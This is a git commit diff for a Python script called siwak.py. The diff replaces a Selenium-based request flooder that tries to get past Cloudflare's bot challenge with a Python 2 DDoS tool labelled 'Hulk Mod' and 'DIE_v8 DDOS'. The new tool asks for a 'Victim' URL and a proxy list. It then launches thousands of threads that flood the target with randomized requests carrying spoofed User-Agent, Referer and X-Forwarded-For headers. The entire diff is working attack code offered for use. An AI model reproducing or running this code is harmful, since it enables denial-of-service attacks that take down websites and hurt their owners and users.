85729efd4b24c91984f1af2eb46d92dd223c7cd0
termul488-ai <termul488@gmail.com>
2026-01-09 00:34:40 +0700

    Update siwak.py

--- siwak.py
+++ siwak.py
@@ -1,93 +1,262 @@
-import time
-import threading
+#!/usr/bin/env python
+#coding: utf-8
 import random
-from selenium import webdriver
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
+import socket
+import threading
+import time
+import datetime
+import urllib2
+import urllib
+import re
+import sys
+import optparse
+import os
+import urlparse
 
-# Daftar proxy dari file teks
-with open('proxy.txt') as f:
-    proxies = f.read().splitlines()
+#Hulk Mod By JokerLjnk
+url=''
+host=''
+headers_useragents=[]
+headers_referers=[]
+keyword_top=[]
+request_counter=0
+flag=0
+safe=0
+def inc_counter():
+	global request_counter
+	request_counter+=1
 
-# Mengatur agen yang akan digunakan
-user_agent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
+def set_flag(val):
+	global flag
+	flag=val
+	
+def set_safe():
+	global safe
+	safe=1
 
-#Meminta Url target
-target_url = "https://example.co.il"
+def getUserAgent():
+    platform = random.choice(['Macintosh', 'Windows', 'X11'])
+    if platform == 'Macintosh':
+        os  = random.choice(['68K', 'PPC'])
+    elif platform == 'Windows':
+        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
+    elif platform == 'X11':
+        os  = random.choice(['Linux i686', 'Linux x86_64'])
+    browser = random.choice(['chrome', 'firefox', 'ie'])
+    if browser == 'chrome':
+        webkit = str(random.randint(500, 599))
+        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
+        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
+    elif browser == 'firefox':
+        currentYear = datetime.date.today().year
+        year = str(random.randint(2000, currentYear))
+        month = random.randint(1, 12)
+        if month < 10:
+            month = '0' + str(month)
+        else:
+            month = str(month)
+        day = random.randint(1, 30)
+        if day < 10:
+            day = '0' + str(day)
+        else:
+            day = str(day)
+        gecko = year + month + day
+        version = str(random.randint(1, 21)) + '.0'
+        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
+    elif browser == 'ie':
+        version = str(random.randint(1, 10)) + '.0'
+        engine = str(random.randint(1, 5)) + '.0'
+        option = random.choice([True, False])
+        if option == True:
+            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
+        else:
+            token = ''
+        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
-# Mengatur jumlah kiriman per second
-requests_per_second = 50
+def referer_list():
+	global headers_referers
+	headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
+	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
+	headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
+	headers_referers.append('http://www.google.com/translate?u=')
+	headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
+	headers_referers.append('http://help.baidu.com/searchResult?keywords=')
+	headers_referers.append('http://www.bing.com/search?q=')
+	headers_referers.append('https://add.my.yahoo.com/rss?url=')
+	headers_referers.append('https://play.google.com/store/search?q=')
+	return(headers_referers)
 
-# Mengatur jumlah detik untuk menjalankan skrip
-run_time_seconds = 60
+def keyword_list():
+	global keyword_top
+	keyword_top.append('Sex')
+	keyword_top.append('Robin Williams')
+	keyword_top.append('World Cup')
+	keyword_top.append('Ca Si Le Roi')
+	keyword_top.append('Ebola')
+	keyword_top.append('Malaysia Airlines Flight 370')
+	keyword_top.append('ALS Ice Bucket Challenge')
+	keyword_top.append('Flappy Bird')
+	keyword_top.append('Conchita Wurst')
+	keyword_top.append('ISIS')
+	keyword_top.append('Frozen')
+	keyword_top.append('014 Sochi Winter Olympics')
+	keyword_top.append('IPhone')
+	keyword_top.append('Samsung Galaxy S5')
+	keyword_top.append('Nexus 6')
+	keyword_top.append('Moto G')
+	keyword_top.append('Samsung Note 4')
+	keyword_top.append('LG G3')
+	keyword_top.append('Xbox One')
+	keyword_top.append('Apple Watch')
+	keyword_top.append('Nokia X')
+	keyword_top.append('Ipad Air')
+	keyword_top.append('Facebook')
+	keyword_top.append('Anonymous')
+	return(keyword_top)
 
-# Mengatur jumlah thread yang akan digunakan
-num_threads = 70
+def buildblock(size):
+	out_str = ''
+	for i in range(0, size):
+		a = random.randint(65, 90)
+		out_str += chr(a)
+	return(out_str)
 
-# Define a function to send requests with Selenium and bypass Cloudflare
-def send_request(proxy):
-    # Create a ChromeDriver instance with Selenium
-    chrome_options = Options()
-    chrome_options.add_argument('--disable-extensions')
-    chrome_options.add_argument('--headless')
-    chrome_options.add_argument('--disable-gpu')
-    chrome_options.add_argument('--no-sandbox')
-    chrome_options.add_argument('--disable-dev-shm-usage')
-    chrome_options.add_argument(f'user-agent={user_agent}')
-    chrome_options.add_argument('--proxy-server=%s' % proxy)
-    driver = webdriver.Chrome(options=chrome_options)
+def httpcall(url):
+	referer_list()
+	code=0
+	if url.count("?")>0:
+		param_joiner = "&"
+	else:
+		param_joiner = "?"
+	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request.add_header('User-Agent', getUserAgent())
+	request.add_header('Cache-Control', 'no-cache')
+	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
+	request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
+	request.add_header('Keep-Alive', random.randint(110,120))
+	request.add_header('Connection', 'keep-alive')
+	request.add_header('Host',host)
 
-    # Send the request to the target URL
-    driver.get(target_url)
+	index = random.randint(0,len(listaproxy)-1)
+	proxy = urllib2.ProxyHandler({'http':listaproxy[index]})
+	opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
+	urllib2.install_opener(opener)	
+	try:
+			urllib2.urlopen(request)
+			if(flag==1): set_flag(0)
+			if(code==500): code=0
+	except urllib2.HTTPError, e:
+			set_flag(1)
+			code=500
+			time.sleep(60)
+	except urllib2.URLError, e:
+			sys.exit()
+	else:
+			inc_counter()
+			urllib2.urlopen(request)
+	return(code)
 
-    # Check if the page is protected by Cloudflare
-    if "DDoS protection by Cloudflare" in driver.title:
-        # Wait for the JavaScript challenge page to appear
-        wait = WebDriverWait(driver, 30)
-        wait.until(EC.presence_of_element_located((By.ID, "challenge-form")))
+class HTTPThread(threading.Thread):
+	def run(self):
+		try:
+			while flag<2:
+				code=httpcall(url)
+				if (code==500) & (safe==1):
+					set_flag(2)
+		except Exception, ex:
+			pass
 
-        # Solve the challenge by waiting for a random amount of time
-        time.sleep(random.uniform(2, 5))
+class MonitorThread(threading.Thread):
+	def run(self):
+		previous=request_counter
+		while flag==0:
+			if (previous+100<request_counter) & (previous<>request_counter):
+				previous=request_counter
+			if flag==2:
+				print ''
 
-        # Submit the challenge form
-        form = driver.find_element_by_id("challenge-form")
-        form.submit()
+#DIE_v8 Mod By Duong Thành
+def randomIp():
+    random.seed()
+    result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
+    result = result + str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
+    return result
 
-        # Wait until the "challenge-running" element disappears
-        wait.until_not(EC.presence_of_element_located((By.ID, "challenge-running")))
+def randomIpList():
+    random.seed()
+    res = ""
+    for ip in xrange(random.randint(8, 10)):
+        res = res + randomIp() + ", "
+    return res[0:len(res) - 2]
+class attacco(threading.Thread):
+    def run(self):
+    	referer_list()
+        current = x
+       
+        if current < len(listaproxy):
+            proxy = listaproxy[current].split(':')
+        else:
+            proxy = random.choice(listaproxy).split(':')
+ 
+        useragent = "User-Agent: " + getUserAgent() + "\r\n"
+        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
+        referer   = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1500)) +  "\r\n"
+        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
 
-    # Get the page source and quit the ChromeDriver instance
-    page_source = driver.page_source
-    driver.quit()
+        while nload:
+        	time.sleep(1)
+        	pass
+           
+        while 1:
+            try:
+                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                a.connect((proxy[0], int(proxy[1])))
+                a.send(httprequest)
+                try:
+                    for i in xrange(4):
+                        a.send(httprequest)
+                except:
+                    tts = 1
+ 
+                   
+            except:
+                proxy = random.choice(listaproxy).split(':')
 
-    return page_source
+#Main
+print '\n\t..:: > Edit Code By Phan < ::..'
+print '\t  ==> #~~  Ddos Super ~~# <==  '
+# Site
+url = raw_input("Victim: ")
+host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
+#Proxy
+in_file = open(raw_input("File proxy: "),"r")
+proxyf = in_file.read()
 
-# Define a function to send multiple requests per second with a random proxy
-def send_requests():
-    while True:
-        proxy = random.choice(proxies)
-        try:
-            page_source = send_request(proxy)
-            print("Success with proxy:", proxy)
-            break
-        except:
-            print("Failed with proxy:", proxy)
 
-    # Wait for a random amount of time before sending the next request
-    time.sleep(random.uniform(1/requests_per_second, 1/(2*requests_per_second)))
-
-# Start the loop to send requests
-start_time = time.time()
-threads = []
-for i in range(num_threads):
-    thread = threading.Thread(target=send_requests)
-    thread.start()
-    threads.append(thread)
-for thread in threads:
-    thread.join()
-while time.time() - start_time < run_time_seconds:
-    send_requests()
-
-print("Done sending requests.")
+in_file.close()
+listaproxy = proxyf.split('\n')
+#So luong
+thread = input("So luong (3000): ")
+get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
+accept = "Accept-Encoding: gzip, deflate\r\n"
+connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
+nload = 1
+x = 0
+print("\tDIE_v8 DDOS Edit By Phan")
+if url.count("/")==2:
+    url = url + "/"
+    m = re.search('http\://([^/]*)/?.*', url)
+    host = m.group(1)
+for x in xrange(int(thread + 1)):
+    attacco().start()
+    time.sleep(0.003)
+print "Attacking ==========================>>"
+for x in xrange(501):
+	t = HTTPThread()
+	t.start()
+t = MonitorThread()
+t.start()
+nload = 0
+while not nload:
+    time.sleep(1)
